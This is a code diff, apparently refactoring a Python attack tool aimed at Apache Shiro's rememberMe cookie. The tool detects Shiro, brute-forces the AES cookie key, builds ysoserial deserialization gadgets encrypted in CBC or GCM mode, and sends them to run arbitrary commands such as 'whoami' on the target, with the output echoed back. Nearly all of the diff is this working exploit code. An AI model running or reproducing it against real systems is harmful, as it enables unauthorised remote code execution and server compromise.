@@ -48,8 +48,7 @@ class Payload:
         cipher = AES.new(base64.b64decode(self.key), AES.MODE_GCM, iv)
         ciphertext, tag = cipher.encrypt_and_digest(file_body)
         ciphertext = ciphertext + tag
-        base64_ciphertext = base64.b64encode(iv + ciphertext)
-        return base64_ciphertext
+        return base64.b64encode(iv + ciphertext)
 
     def cbc_encrypt(self, file_body=None):
         file_body = self.file_body if file_body is None else file_body
@@ -87,16 +86,15 @@ class CheckShiro(Command):
             request = requests.get(url=url, timeout=10, proxies=self.proxies,
                                    verify=False, headers=__header, allow_redirects=False)
             if request.raise_for_status() != None:
-                print("[!] {} redirected or inaccessible!".format(url))
-                print("[!] The status code : {}".format(
-                    str(request.status_code)))
+                print(f"[!] {url} redirected or inaccessible!")
+                print(f"[!] The status code : {str(request.status_code)}")
                 alive_url = None
                 exit()
             else:
                 alive_url = url
         except Exception as e:
             alive_url = None
-            print("[!] The target URL : {} can't connect!\n".format(url))
+            print(f"[!] The target URL : {url} can't connect!\n")
             # print("\r\n{}\r\n".format(e))
             return None
 
@@ -108,25 +106,26 @@ class CheckShiro(Command):
                                         verify=False, headers=__header, allow_redirects=False, data=self.data)
                 res_length = len(str(request.headers))
             except requests.exceptions.Timeout as e:
-                print("[!] {} read time out!".format(alive_url))
+                print(f"[!] {alive_url} read time out!")
                 return
             if "rememberMe" in str(request.headers):
-                print("[*] Shiro framework exists for {} !".format(url))
+                print(f"[*] Shiro framework exists for {url} !")
                 return res_length
             else:
                 print(
-                    "[!] The Shiro framework may not exist for {},maybe you can remove '--data'/'-d' argument and try again \n".format(url))
+                    f"[!] The Shiro framework may not exist for {url},maybe you can remove '--data'/'-d' argument and try again \n")
+
         else:
             request = requests.get(url=alive_url, cookies={'rememberMe': self.__random_str}, timeout=10, proxies=self.proxies,
                                    verify=False, headers=__header, allow_redirects=False)
             res_length = len(str(request.headers))
 
             if "rememberMe" in str(request.headers):
-                print("[*] Shiro framework exists for {} !".format(url))
+                print(f"[*] Shiro framework exists for {url} !")
                 return res_length
             else:
                 print(
-                    "[!] The Shiro framework may not exist for {},maybe you can add '--data'/'-d' argument and try again \n".format(url))
+                    f"[!] The Shiro framework may not exist for {url},maybe you can add '--data'/'-d' argument and try again \n")
 
 
 class VerifyKey(Command):
@@ -152,23 +151,20 @@ class VerifyKey(Command):
                 if self.data is None:
                     r = requests.get(url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                      verify=False, headers=__header, allow_redirects=False, data=data)
-                    rsp = len(str(r.headers))
                 else:
                     r = requests.post(url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                       verify=False, headers=__header, allow_redirects=False, data=data)
-                    rsp = len(str(r.headers))
-
+                rsp = len(str(r.headers))
                 if res_length != rsp and r.status_code != 400:
                     print("[*] {0} crack sucess!".format(url))
                     print("[*] The correct key : {0}".format(keys[i]))
                     print("[*] The payload : {0}\n".format(payload))
                     return keys[i]
-            else:
-                print("[!] The shiro key of {} cracking failed!".format(url))
-                return False
+            print(f"[!] The shiro key of {url} cracking failed!")
+            return False
 
         else:
-            print("[*] Start checking the shiro key : {}".format(self.key))
+            print(f"[*] Start checking the shiro key : {self.key}")
             if self.type == 'CBC':
                 payload = Payload(self.key).cbc_encrypt().decode()
             elif self.type == 'GCM':
@@ -176,12 +172,10 @@ class VerifyKey(Command):
             if self.data is None:
                 r = requests.get(url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                  verify=False, headers=__header, allow_redirects=False, data=data)
-                rsp = len(str(r.headers))
             else:
                 r = requests.post(url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                   verify=False, headers=__header, allow_redirects=False, data=data)
-                rsp = len(str(r.headers))
-
+            rsp = len(str(r.headers))
         if res_length != rsp and r.status_code != 400:
             print("[*] {0} crack sucess!".format(url))
             print("[*] The correct key : {0}".format(self.key))
@@ -211,8 +205,7 @@ class Exploit(Command):
 
         if gadget in tomcatEchoPayload:
             checker = str(uuid.uuid1())
-            payload_command = self.command + " && echo " + \
-                checker if self.command else "whoami" + " && echo " + checker
+            payload_command = f"{self.command} && echo {checker}" if self.command else f"whoami && echo {checker}"
 
             headers = {"User-Agent": Factory.create().user_agent(),
                        "Connection": "close",
@@ -235,17 +228,15 @@ class Exploit(Command):
                 for i in rsp.iter_content(chunk_size=102400):
                     if checker in str(i.decode()):
                         print(i.decode().replace(checker, ""))
-                        break
                     elif regex.findall(rsp.text) == []:
                         print("[!] Get result faild!")
                         print("[!] Exploit Manual: ")
-                        print("Testcmd: {}".format(self.command))
-                        print("Testecho: {}".format(checker))
-                        print("Cookie: rememberMe={}\n".format(payload))
-                        break
+                        print(f"Testcmd: {self.command}")
+                        print(f"Testecho: {checker}")
+                        print(f"Cookie: rememberMe={payload}\n")
                     else:
                         print(regex.findall(rsp.text)[0])
-                        break
+                    break
         else:
             print("[!] Gadget Not Support")
 
@@ -258,14 +249,11 @@ class Exploit(Command):
         with subprocess.Popen(['java', '-jar', os.path.join(sys.path[0], "ysoserial.jar"), self.gadget, self.command], stdout=subprocess.PIPE) as op:
             popen = op.stdout.read()
 
-        try:
+        with contextlib.suppress(UnicodeDecodeError):
             popen.decode()
             if "Y SO SERIAL?" in popen.decode():
                 print("[!] Gadget not sport!\n")
                 return
-        except UnicodeDecodeError:
-            pass
-
         file_body = base64.b64encode(popen)
 
         if self.type == 'CBC':
@@ -284,7 +272,7 @@ class Exploit(Command):
             r = requests.get(url=url, headers=headers,
                              cookies=cookies, verify=False)
         try:
-            print("[*] Send over : {}\n".format(r.status_code))
+            print(f"[*] Send over : {r.status_code}\n")
         except Exception as e:
             print("[*] URL: {0} Error!\n{1}".format(url, e))
             print("[*] Exploit Manual: ")
@@ -315,7 +303,7 @@ class Exploit(Command):
             r = requests.get(url=url, headers=headers,
                              cookies=cookies, verify=False)
         try:
-            print("[*] Send over : {}\n".format(r.status_code))
+            print(f"[*] Send over : {r.status_code}\n")
         except Exception as e:
             print("[*] URL: {0} Error!\n{1}".format(url, e))
             print("[*] Exploit Manual: ")
